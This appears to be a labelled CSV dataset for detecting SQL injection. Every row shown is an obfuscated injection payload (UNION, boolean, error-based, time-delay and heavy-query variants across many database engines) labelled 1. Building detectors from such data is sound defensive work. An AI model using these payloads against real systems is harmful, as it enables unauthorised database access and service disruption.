Query,Label
"-6593""  )   union all %%s%%e%l%%e%c%%t 6216,6216,6216,6216,6216,6216,6216#",1
"1""  )   a%n%%d make_%se%%t  (  4539  =  6401,6401  )   a%n%%d   (  ""kglx""  =  ""kglx",1
1'  )   %%a%n%d 7290  =  8416 %%a%n%d   (  'ktlz' l%i%k%e 'ktlz,1
"-8472'  )   w%h%%er%e 3340  =  3340 %o%r make_%se%t  (  1752  =  9905,9905  )  --",1
"1""  )   w%h%%ere 9770  =  9770 union all s%%e%l%ect %n%ul%%l,%n%ul%%l,%n%ul%%l,%n%ul%%l,%n%ul%%l,%n%ul%%l--",1
"1'+  (  %s%e%l%e%%ct ocvc %w%%h%%e%r%%e 6981  =  6981 union all %s%e%l%e%%ct %%n%%u%ll,%%n%%u%ll,%%n%%u%ll,%%n%%u%ll,%%n%%u%ll,%%n%%u%ll,%%n%%u%ll,%%n%%u%ll,%%n%%u%ll,%%n%%u%ll#",1
"1   )    )    union all s%e%l%%e%%ct n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l--",1
"-6214"" union all s%e%%l%%e%%c%t 3323,3323#",1
-7979'+  (  %s%e%%l%e%c%%t 'bkvt' %%wh%%e%%r%%e 3613  =  3613 union all %s%e%%l%e%c%%t 3613#,1
"1'||  (  %se%l%%ect 'ymwf' %%w%%h%%e%r%e 1229  =  1229 o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,n%%u%l%%l   )    )   ||'",1
%s%el%ec%%t sleep  (  5  )   %%a%%n%d    (    (   3404  =  3404,1
1'||  (  %s%e%le%%ct 'fjlg' %%f%ro%%m dual %%w%h%%e%re 9517  =  9517,1
"1   )    )     )   %%a%%n%%d 2716  =    (  s%e%%l%e%%c%%t count  (  *  )   %%f%rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-3879' union all %%s%%e%lect 9814,9814,9814,9814,9814,9814,9814,9814,9814--",1
"1%""  )   union all se%%l%%ec%t %%nu%l%%l--",1
"1' o%%r 8421  =    (  %%se%l%e%%ct count  (  *  )   %f%ro%m generate_series  (  1,5000000   )    )    %a%%n%%d 'jiyx'  =  'jiyx",1
"1%""   )    )     )   %a%%n%%d 3754  =    (  s%%e%%l%ec%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%e%%l%ec%t   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   %f%%r%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %f%%r%%o%m dual  )   %a%%n%%d    (    (     (  ""%""  =  """,1
"-2085""  )   as hkev %%w%%h%e%%r%e 7730  =  7730 union all %%se%%l%e%%ct 7730,7730--",1
"1' i%n boolean mode  )   %%a%%n%d char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substri%ng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,%%n%ull  )  --",1
1%'  )   %a%nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %s%e%le%ct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %a%nd   (  '%'  =  ',1
"1%' o%%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1 %%whe%%r%%e 8398  =  8398,1
%s%e%%l%e%c%%t   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  %s%e%%l%e%c%%t 8808 %%f%rom master..sys%d%ata%%b%%as%%es  )   end  )  --,1
s%e%l%e%c%t   (  case when   (  7096  =  2568  )   then 7096 else 1/  (  s%e%l%e%c%t 0  )   end  )  --,1
"1%' union all s%%el%e%%ct n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l#",1
-1375'   )    )     )   o%r   (  1226  =  9648  )  *9648 a%%n%%d    (    (     (  'kfoy' %%lik%%e 'kfoy,1
"%%s%el%%e%ct count  (  *  )   %%f%r%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %a%%n%%d    (    (     (  1105  =  1105",1
"1""   )    )    as dshc w%h%%e%re 9911  =  9911 or 1022  =    (  s%%e%le%ct count  (  *  )   %%f%%r%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"s%e%l%%ec%%t count  (  *  )   %f%%r%%om sysibm.syst%%a%b%%les as t1,sysibm.syst%%a%b%%les as t2,sysibm.syst%%a%b%%les as t3 %a%%n%%d    (    (     (  ""mubt""  =  ""mubt",1
"1'  )   w%%he%%re 9544  =  9544 %%o%%r exp  (  ~  (  %%se%l%%e%ct * %f%%rom   (  %%se%l%%e%ct concat  (  0x7171706a71,  (  %%se%l%%e%ct   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"1 a%%n%d char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substr%ing  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,%%nu%ll  )  --",1
"  (  %s%e%l%%e%c%t 1 %fr%%o%%m generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   %%l%imit 1  )  ",1
1' r%%li%%k%%e   (  %%sele%%c%t * %fr%o%m   (  %%sele%%c%t  (  sleep  (  5   )    )     )  sgvo  )   a%n%%d 'obwn'  =  'obwn,1
"1 %a%n%d elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",1
"-7868' in boolean mode  )   union all %s%%e%%l%e%c%%t 5117,5117,5117,5117,5117,5117,5117,5117,5117#",1
"-3593%' union all %%s%e%le%c%t 6346,6346,6346,6346,6346,6346--",1
"1' or 9643  =    (  %se%%l%ec%t count  (  *  )   fr%o%%m domai%%n.domai%%ns as t1,domai%%n.columns as t2,domai%%n.t%a%b%l%%es as t3  )   %%and 'xqkq'  =  'xqkq",1
"-6093'  )   w%%he%re 9676  =  9676 union all selec%t 9676,9676,9676,9676,9676,9676--",1
-2891 %w%he%r%e 1770  =  1770 %%o%r 9290  =  5866,1
"-3562""  )   as eghl wh%e%%re 7094  =  7094 union all %s%e%%le%c%%t 7094,7094,7094,7094#",1
"1'+  (  %s%e%le%%c%%t rqcw %w%%h%%e%r%%e 9002  =  9002 union all %s%e%le%%c%%t n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l,n%%u%l%%l#",1
"1'  )   union all s%ele%c%%t nul%l,nul%l,nul%l,nul%l,nul%l,nul%l--",1
" end an%%d ""mdje"" l%i%ke ""mdje",1
"1""  )   w%%h%ere 3679  =  3679",1
-9225  )   %o%%r   (  8258  =  2726  )  *2726 %a%%n%%d   (  9900  =  9900,1
"1'+  (  se%le%c%%t %%inrv %whe%re 2178  =  2178 %o%r 7417  =    (  se%le%c%%t count  (  *  )   %%f%%r%%om sysibm.sys%%t%%abl%%es as t1,sysibm.sys%%t%%abl%%es as t2,sysibm.sys%%t%%abl%%es as t3  )  --",1
"1%' %%o%%r 1022  =    (  %se%le%c%%t count  (  *  )   %f%ro%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
s%e%l%%e%c%t case when 9390  =  5752 then 1 else %nul%%l end--,1
1' %%w%%h%e%re 8099  =  8099,1
"1  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%%i%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%n%ull  )  --",1
1' %and 8594  =    (  s%%ele%%c%%t 8594 %%f%%r%o%%m pg_sleep  (  5   )    )   --,1
"1'   )    )    as tfub wh%e%%r%%e 3461  =  3461 %%or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1%'   )    )    %%o%%r row  (  1045,7562  )  >  (  %se%le%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %se%le%%c%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%%o%%r  (  r%a%%nd  (  0  )  *2   )    )   x %%f%%r%%om   (  %se%le%%c%t 8488 union %se%le%%c%t 5584 union %se%le%%c%t 3051 union %se%le%%c%t 1210  )  a group b%y x  )   %a%%nd    (    (   '%'  =  '",1
"1""  )   union all %select %%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l--",1
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   a%nd    (    (     (  ""whld""  =  ""whld",1
"call regexp_substri%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   %an%d   (  '%'  =  '",1
"1"" %%w%h%e%%r%%e 8241  =  8241 union all %%s%%e%le%%c%%t %nu%%l%l,%nu%%l%l,%nu%%l%l#",1
"-8841%""  )   o%%r 4361  =  1910",1
s%ele%%ct   (  case when   (  5163  =  4861  )   then 1 else 5163*  (  s%ele%%ct 5163 %%f%%ro%%m master..sys%d%%a%ta%b%a%%s%%es  )   end  )  --,1
"1'||  (  %%se%%l%e%%ct 'xsoq' %fr%o%m dual %wh%e%re 6690  =  6690 a%%n%%d 6510  =    (  %%se%%l%e%%ct count  (  *  )   %fr%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1
"1%"" a%n%d 9198  =  9198--",1
"1'  )   %o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%ul%%l  )  ,0  )  ,500000000  )  ,%%n%%ul%%l  )   and   (  'tvcm'  =  'tvcm",1
" end %%a%%n%d   (  ""%""  =  """,1
"-5509%""   )    )     )   union all %%sel%ec%t 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",1
1 %%a%nd   (  se%l%%ect * %%fr%o%m   (  se%l%%ect  (  sleep  (  5   )    )     )  fzno  ) ,1
"1'+  (  %s%%e%%le%c%%t cjcp %%w%%he%r%e 2590  =  2590 union all %s%%e%%le%c%%t %nu%l%%l,%nu%l%%l,%nu%l%%l,%nu%l%%l,%nu%l%%l,%nu%l%%l,%nu%l%%l#",1
"1""  )   %%a%%n%d 6510  =    (  %se%%l%e%%ct count  (  *  )   f%%r%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   %%a%%n%d   (  ""qblj"" %%l%%ik%%e ""qblj",1
"1' a%n%%d make_s%e%%t  (  8403  =  8403,8899  )  ",1
"-3492"" %wh%er%e 4094  =  4094 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%s%el%%e%%ct   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
-6310 o%%r 6715  =  3399,1
"1""  )   %o%r 8384  =  %like  (  'abcdefg',upper  (  hex  (  r%a%n%%domblob  (  500000000/2   )    )      )    )    %a%n%%d   (  ""vkqt""  =  ""vkqt",1
"1""   )    )    a%nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%s%el%ec%t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a%nd    (    (   ""duuw""  =  ""duuw",1
"1%'   )    )     )   %%o%%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selec%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    %%a%%nd    (    (     (  '%'  =  '",1
1'+  (  se%%l%%ect 'kicv' %where 1976  =  1976 %%a%n%%d 3754  =    (  se%%l%%ect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se%%l%%ect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   %%f%ro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%f%ro%%m dual   )    )   +',1
"1%"" %a%%n%%d 6408  =  7959--",1
"call regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%null  )  ,0  )  ,500000000  )  ,%null  )   %%a%%nd ""cuzi"" l%%ik%%e ""cuzi",1
"1%'   )    )    %%a%%nd 6414  =    (  %s%%e%l%e%%c%%t count  (  *  )   %%fr%%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   %%a%%nd    (    (   '%'  =  '",1
1' a%n%%d sleep  (  5  ) ,1
"1""  )   %w%he%r%e 6956  =  6956 or 8315  =    (  %%s%%e%%le%c%t count  (  *  )   %%f%%r%%o%%m sysibm.systa%bl%%es as t1,sysibm.systa%bl%%es as t2,sysibm.systa%bl%%es as t3  )  --",1
"1%""   )    )    an%d   (  %%s%%el%%e%c%t 9067 f%%rom  (  %%s%%el%%e%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%%el%%e%c%t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%%or  (  ran%d  (  0  )  *2   )    )   x f%%rom %inf%%ormation_schema.character_se%%ts group b%y x  )  a  )   an%d    (    (   ""%""  =  """,1
"1',  (  se%l%%e%c%t   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as %i%%nt  )  /  (  se%l%%e%c%t 0 %fro%m dual  )   end  )   %fro%m dual  )  ",1
"1' or 2367  =    (  %s%%e%l%ec%t count  (  *  )   %f%ro%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"%sel%e%%c%%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    %%a%n%d    (    (   '%'  =  '",1
se%l%e%c%t case when 4176  =  6138 then 1 else nu%l%%l end--,1
"1""  )   as hfvz %%w%%h%%e%re 7186  =  7186 union all s%%e%l%%e%%ct %n%%u%%l%l,%n%%u%%l%l,%n%%u%%l%l,%n%%u%%l%l,%n%%u%%l%l,%n%%u%%l%l#",1
"-3461""   )    )    union all %se%l%%e%c%%t 6342,6342,6342,6342,6342,6342#",1
-5134   )    )     )   %or 8571  =  8571--,1
"1'  )   %%an%d   (  s%e%le%%c%%t 9067 %%f%%ro%m  (  s%e%le%%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%e%le%%c%%t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%%or  (  r%%an%d  (  0  )  *2   )    )   x %%f%%ro%m inf%%ormation_schema.character_%%s%%ets group b%%y x  )  a  )   %%an%d   (  'wfws'  =  'wfws",1
"1'  )    (  %%se%l%%ect   (  case when   (  4587  =  4587  )   then regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%%ul%l  )  ,0  )  ,500000000  )  ,%n%%ul%l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   %%fro%%m   (  %v%a%%l%ue%%s  (  0   )    )     )   an%%d   (  'ylit' %l%%i%k%e 'ylit",1
"-3856""  )   as iyzl w%h%%e%%r%%e 7394  =  7394 %%or 1570  =  convert  (  int,  (  s%%e%le%c%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s%%e%le%c%t   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1  )   as czeu %%whe%%r%%e 1738  =  1738 o%r exp  (  ~  (  %%se%%le%c%t * f%%r%%om   (  %%se%%le%c%t concat  (  0x7171706a71,  (  %%se%%le%c%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"1""   )    )     )   o%%r   (  %s%%e%l%%e%c%t * %f%r%o%%m   (  %s%%e%l%%e%c%t  (  sleep  (  5   )    )     )  sddo  )  #",1
"-9456%""   )    )    o%r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %s%%elec%t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   a%n%d    (    (   ""%""  =  """,1
"-1168   )    )    as vlol %%wh%e%%r%e 3475  =  3475 %%o%%r 1 group by concat  (  0x7171706a71,  (  %s%elect   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flo%%o%%r  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"se%l%e%%c%%t * %f%r%%o%m generate_series  (  7407,7407,case when   (  7407  =  6562  )   then 1 else 0 end  )   l%%imit 1--",1
s%e%%le%%ct   (  case when   (  3681  =  5989  )   then 3681 else cast  (  1 as %%i%nt  )  /  (  s%e%%le%%ct 0 f%r%%o%m dual  )   end  )   f%r%%o%m dual--,1
-9143  )   %%o%r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %se%l%%ec%t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"-8614'  )   o%%r 1 group b%y concat  (  0x7171706a71,  (  %%s%%e%l%e%%ct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floo%%r  (  r%an%%d  (  0  )  *2   )    )    hav%i%%ng m%i%%n  (  0  )  #",1
"1'   )    )    %a%n%%d 5556  =    (  %%sel%e%c%t count  (  *  )   %f%%r%%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %a%n%%d    (    (   'nvsy' li%%k%e 'nvsy",1
1%'   )    )    an%%d 6240  =    (  'qqpjq'||  (  sel%%e%c%t case 6240 when 6240 then 1 else 0 end f%r%o%%m rdb$%%d%%at%%a%b%a%%s%e  )  ||'qzvzq'  )   an%%d    (    (   '%'  =  ',1
"1""  )   w%her%%e 5814  =  5814 %%a%nd 6969  =    (  s%%e%%l%%e%ct 6969 %f%%ro%m pg_sleep  (  5   )    )   --",1
1'  )   %%w%h%e%re 2763  =  2763,1
1' %w%%h%e%%r%%e 8770  =  8770 union all se%l%e%%c%%t %%nu%l%%l--,1
"1"" %w%%h%%e%%re 8918  =  8918   (  s%e%%l%e%c%%t   (  case when   (  4587  =  4587  )   then regexp_substri%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu%ll  )  ,0  )  ,500000000  )  ,nu%ll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   %f%%ro%%m   (  v%%al%u%%e%s  (  0   )    )     )  --",1
"1'||  (  %%s%ele%%c%%t 'vsfg' %w%h%e%re 3547  =  3547 an%d %%u%%p%%d%a%texml  (  3393,concat  (  0x2e,0x7171706a71,  (  %%s%ele%%c%%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",1
"1' %%an%d   (  %se%%l%e%c%t 9067 %%fr%%om  (  %se%%l%e%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %se%%l%e%c%t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%o%r  (  r%%an%d  (  0  )  *2   )    )   x %%fr%%om i%nf%o%rmation_schema.character_sets group by x  )  a  )   %%an%d 'rxdz'  =  'rxdz",1
1'+  (  %%se%%le%ct 'vnue' %w%h%%e%r%%e 5807  =  5807,1
1'   )    )     )   r%%li%k%e   (  %%se%%le%%ct   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    %%and    (    (     (  'gsjp'  =  'gsjp,1
"-3666""   )    )     )   union all %%se%l%%e%c%t 4136,4136,4136--",1
"1%""  )   %o%%r   (  %%se%l%%e%%c%%t * %%from   (  %%se%l%%e%%c%%t  (  sleep  (  5   )    )     )  sddo  )  #",1
"-3037  )   %w%he%%re 9024  =  9024 union all %sel%e%%c%%t 9024,9024--",1
"%se%lec%%t * %%fr%o%%m generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   %%l%i%m%%i%t 1--",1
"1   )    )    union all %s%el%%e%ct %null,%null,%null,%null--",1
-2452'   )    )     )   union all %s%%el%%e%ct 1951--,1
"1'   )    )    %%or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %se%l%%e%%ct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    %%an%d    (    (   'tblb'  =  'tblb",1
"1'   )    )    %a%%n%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%%ul%%l  )  ,0  )  ,500000000  )  ,%n%%ul%%l  )   %a%%n%d    (    (   'swjk'  =  'swjk",1
"1'  )   as ghks %%wh%e%%r%e 5128  =  5128 union all %sel%e%%ct %%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l#",1
1'+  (  s%%e%l%%e%%c%%t 'mquh' w%h%e%r%%e 3933  =  3933,1
-9556 %%o%%r   (  2049  =  6967  )  *6967# mhbc,1
%se%l%%e%%c%t case when 3252  =  9622 then 1 else n%%ull end--,1
"1' %or row  (  1045,7562  )  >  (  %%se%le%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%se%le%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%or  (  r%an%%d  (  0  )  *2   )    )   x %f%%rom   (  %%se%le%c%%t 8488 union %%se%le%c%%t 5584 union %%se%le%c%%t 3051 union %%se%le%c%%t 1210  )  a group b%y x  )   %an%%d 'kdxg' %lik%%e 'kdxg",1
"1' %%o%%r 5286  =    (  %%sele%%ct count  (  *  )   %%f%ro%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %an%%d 'yfkk'  =  'yfkk",1
"%%s%el%%ec%%t count  (  *  )   f%r%%om generate_series  (  1,5000000  )   %a%%n%d   (  'cewn'  =  'cewn",1
"1%'   )    )     )   or 5286  =    (  s%e%l%ect count  (  *  )   %fr%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %%an%%d    (    (     (  '%'  =  '",1
"1""   )    )    as maxe %wh%%e%r%e 5883  =  5883 union all %s%%ele%ct n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l,n%%ul%%l#",1
"%s%e%%l%e%c%t count  (  *  )   f%r%%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 an%%d    (    (   'xaoi'  =  'xaoi",1
1'  )   union all sel%e%%ct n%u%l%%l--,1
"1%""   )    )    an%%d 4386  =  utl_%%i%%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel%ec%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %%fr%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    an%%d    (    (   ""%""  =  """,1
"-3379  )   union all s%%e%l%%e%c%t 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",1
"1   )    )    as oqfr %%whe%%r%%e 6426  =  6426 %a%n%d make_%se%t  (  8403  =  8403,8899  )  --",1
"1"" a%%n%d u%pd%%a%t%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  %%s%e%%lec%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
1'||  (  %s%e%%le%%ct 'aioq' f%%r%%om dual %w%he%%r%e 8176  =  8176,1
"-7460"" union all se%l%e%ct 4273,4273,4273,4273,4273,4273,4273,4273#",1
"1""   )    )     )   o%r 6979  =  l%%ik%e  (  'abcdefg',upper  (  hex  (  ra%n%%domblob  (  500000000/2   )    )      )    )   --",1
"-5062""   )    )     )   o%%r   (  1069  =  8974  )  *8974 %%an%d    (    (     (  ""hsge""  =  ""hsge",1
"%sel%%ect * f%r%o%%m generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   %%li%%m%i%t 1--",1
"1""   )    )    %%a%%n%%d 3202  =  %lik%e  (  'abcdefg',upper  (  hex  (  r%%a%%n%%domblob  (  500000000/2   )    )      )    )    %%a%%n%%d    (    (   ""yrgy"" %lik%e ""yrgy",1
"1'+  (  selec%%t bldn %%w%her%%e 8321  =  8321 %and 8635  =    (  selec%%t count  (  *  )   %f%%r%%o%m generate_series  (  1,5000000   )    )   --",1
1' %%w%%he%%r%%e 4388  =  4388,1
"-7469  )   w%%h%e%re 5875  =  5875 o%r make_%s%e%%t  (  9354  =  9354,7185  )  --",1
-6755  )   o%%r 9323  =  9323#,1
"1  )   %%and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%e%%le%c%t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   %fr%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
"1'   )    )    %%o%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%n%%u%ll  )   %and    (    (   'brlc'  =  'brlc",1
"1'+  (  %%s%e%l%ec%%t yfuu %w%%her%%e 1717  =  1717 union all %%s%e%l%ec%%t %n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll,%n%u%ll--",1
